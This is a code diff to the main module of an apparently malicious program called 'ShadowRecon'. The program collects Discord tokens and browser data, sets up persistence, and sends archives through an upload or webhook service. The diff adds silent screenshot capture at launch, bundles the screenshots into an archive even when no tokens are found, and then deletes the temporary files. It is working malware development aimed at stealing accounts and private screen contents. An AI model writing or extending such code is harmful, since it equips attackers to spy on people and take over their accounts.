@@ -11,16 +11,19 @@ const { stats } = require('./core/statistics');
 const { BrowserCollector } = require('./modules/browsers/collector');
 const { DiscordService } = require('./services/discord/service');
 const { uploadService } = require('./services/upload/service');
+const ScreenshotCapture = require('./modules/screenshot/capture');
 const CoreUtils = require('./core/utils');
 
 class Application {
     constructor() {
         this.initialized = false;
         this.results = {};
+        this.screenshots = [];
         
         // Initialize services
         this.browserCollector = new BrowserCollector();
         this.discordService = new DiscordService();
+        this.screenshotCapture = new ScreenshotCapture();
         
         // Setup error handlers
         ErrorHandler.setupGlobalHandlers();
@@ -43,6 +46,9 @@ class Application {
 
             // Collect system information
             await this.collectSystemInfo();
+
+            // Capture initial screenshot when launching
+            await this.captureInitialScreenshot();
 
             // Setup persistence if enabled
             await this.setupPersistence();
@@ -99,6 +105,36 @@ class Application {
     }
 
     /**
+     * Capture initial screenshot when application starts
+     */
+    async captureInitialScreenshot() {
+        try {
+            const modules = config.get('modules.enabled');
+            if (!modules.screenshot) {
+                logger.debug('Screenshot module disabled');
+                return;
+            }
+
+            logger.info('Capturing initial screenshot');
+            
+            // Set output directory to temp for now (will be moved to proper location later)
+            const tempDir = require('path').join(require('os').tmpdir(), 'shadowrecon_screenshots');
+            this.screenshotCapture.setOutputDirectory(tempDir);
+
+            // Take initial screenshot
+            const screenshotPath = await this.screenshotCapture.takeScreenshot();
+            if (screenshotPath) {
+                this.screenshots.push(screenshotPath);
+                logger.info('Initial screenshot captured successfully', { path: screenshotPath });
+            } else {
+                logger.warn('Failed to capture initial screenshot');
+            }
+        } catch (error) {
+            logger.error('Error capturing initial screenshot', error.message);
+        }
+    }
+
+    /**
      * Run data collection modules
      */
     async collectData() {
@@ -120,19 +156,40 @@ class Application {
                 // Exit early if no Discord accounts found
                 const discordAccounts = results.discord?.length || 0;
                 if (discordAccounts === 0) {
-                    logger.info('No Discord tokens found - exiting without collecting other data or creating files');
+                    logger.info('No Discord tokens found - checking if screenshots should still be processed');
+                    
+                    // If we have screenshots captured, still create archive with screenshots only
+                    if (this.screenshots.length > 0) {
+                        logger.info(`Found ${this.screenshots.length} screenshots - creating archive with screenshots only`);
+                        return { screenshots: this.screenshots.length }; // Return special result to indicate screenshots should be processed
+                    }
+                    
+                    logger.info('No Discord tokens found and no screenshots - exiting without creating files');
                     return null; // Return null to indicate no data should be processed
                 }
                 
                 logger.info(`Found ${discordAccounts} Discord accounts - proceeding with data collection`);
             } catch (error) {
                 ErrorHandler.handle(error);
-                logger.info('Discord data collection failed - exiting without creating files');
+                
+                // If we have screenshots captured, still create archive with screenshots only
+                if (this.screenshots.length > 0) {
+                    logger.info(`Discord data collection failed but found ${this.screenshots.length} screenshots - creating archive with screenshots only`);
+                    return { screenshots: this.screenshots.length }; // Return special result to indicate screenshots should be processed
+                }
+                
+                logger.info('Discord data collection failed and no screenshots - exiting without creating files');
                 return null; // Return null to indicate no data should be processed
             }
         } else {
-            logger.info('Discord module disabled - exiting without creating files');
-            return null; // If Discord module is disabled, don't create any files
+            // If Discord module is disabled, check if we have screenshots
+            if (this.screenshots.length > 0) {
+                logger.info(`Discord module disabled but found ${this.screenshots.length} screenshots - creating archive with screenshots only`);
+                return { screenshots: this.screenshots.length }; // Return special result to indicate screenshots should be processed
+            }
+            
+            logger.info('Discord module disabled and no screenshots - exiting without creating files');
+            return null; // If Discord module is disabled and no screenshots, don't create any files
         }
 
         // Browser data collection - only if we have Discord tokens
@@ -172,6 +229,9 @@ class Application {
             // Initialize file manager now that we know we have Discord tokens to process
             fileManager.init();
 
+            // Save screenshots to the archive
+            await this.saveScreenshots();
+
             // Create archive
             const zipPath = await fileManager.createZip();
             const zipSizeMB = fileManager.getZipSizeMB();
@@ -203,6 +263,35 @@ class Application {
         } catch (error) {
             ErrorHandler.handle(error);
             throw error;
+        }
+    }
+
+    /**
+     * Save captured screenshots to the file manager
+     */
+    async saveScreenshots() {
+        try {
+            if (this.screenshots.length === 0) {
+                logger.debug('No screenshots to save');
+                return;
+            }
+
+            logger.info(`Saving ${this.screenshots.length} screenshots to archive`);
+
+            for (let i = 0; i < this.screenshots.length; i++) {
+                const screenshotPath = this.screenshots[i];
+                const fileName = `screenshot_${i + 1}_${require('path').basename(screenshotPath)}`;
+                
+                if (fileManager.saveSingle(screenshotPath, 'Screenshots', fileName)) {
+                    logger.debug(`Screenshot saved to archive: ${fileName}`);
+                } else {
+                    logger.warn(`Failed to save screenshot: ${screenshotPath}`);
+                }
+            }
+
+            logger.info('Screenshots saved to archive successfully');
+        } catch (error) {
+            logger.error('Error saving screenshots', error.message);
         }
     }
 
@@ -244,9 +333,35 @@ class Application {
             // Clean up temporary files
             fileManager.cleanup();
 
+            // Clean up screenshot temporary files
+            await this.cleanupScreenshots();
+
             logger.info('Cleanup completed');
         } catch (error) {
             logger.error('Cleanup failed', error.message);
+        }
+    }
+
+    /**
+     * Clean up screenshot temporary files
+     */
+    async cleanupScreenshots() {
+        try {
+            for (const screenshotPath of this.screenshots) {
+                if (require('fs').existsSync(screenshotPath)) {
+                    require('fs').unlinkSync(screenshotPath);
+                    logger.debug(`Cleaned up screenshot: ${screenshotPath}`);
+                }
+            }
+
+            // Clean up temporary screenshot directory if it exists
+            const tempDir = require('path').join(require('os').tmpdir(), 'shadowrecon_screenshots');
+            if (require('fs').existsSync(tempDir)) {
+                require('fs').rmSync(tempDir, { recursive: true, force: true });
+                logger.debug(`Cleaned up screenshot temp directory: ${tempDir}`);
+            }
+        } catch (error) {
+            logger.debug('Screenshot cleanup failed', error.message);
         }
     }
 
@@ -272,13 +387,21 @@ class Application {
             // Collect data
             const results = await this.collectData();
             
-            // Exit early if no Discord tokens were found (results will be null)
+            // Exit early if no data was collected (results will be null)
             if (results === null) {
-                logger.info('ShadowRecon completed - no Discord tokens found, no files created');
+                logger.info('ShadowRecon completed - no data collected, no files created');
                 return;
             }
 
-            // Process and send data
+            // Check if we have only screenshots (special case)
+            if (results.screenshots && Object.keys(results).length === 1) {
+                logger.info('Processing screenshots only (no Discord tokens found)');
+                await this.processScreenshotsOnly();
+                logger.info('ShadowRecon completed - screenshots processed');
+                return;
+            }
+
+            // Process and send data (normal case with Discord tokens)
             await this.processAndSend();
 
             logger.info('ShadowRecon completed successfully');
@@ -288,6 +411,38 @@ class Application {
         } finally {
             // Always cleanup
             await this.cleanup();
+        }
+    }
+
+    /**
+     * Process screenshots only (when no Discord tokens are found)
+     */
+    async processScreenshotsOnly() {
+        try {
+            logger.info('Processing screenshots without other data');
+
+            // Initialize file manager
+            fileManager.init();
+
+            // Save screenshots to the archive
+            await this.saveScreenshots();
+
+            // Create archive
+            const zipPath = await fileManager.createZip();
+            const zipSizeMB = fileManager.getZipSizeMB();
+
+            logger.info('Screenshots archive created', {
+                path: zipPath,
+                size: `${zipSizeMB.toFixed(2)} MB`,
+                screenshots: this.screenshots.length
+            });
+
+            // For testing purposes, we'll just log the creation
+            // In a real scenario, this could still be sent via webhook
+            logger.info('Screenshots archive ready for collection');
+        } catch (error) {
+            ErrorHandler.handle(error);
+            throw error;
         }
     }
 }
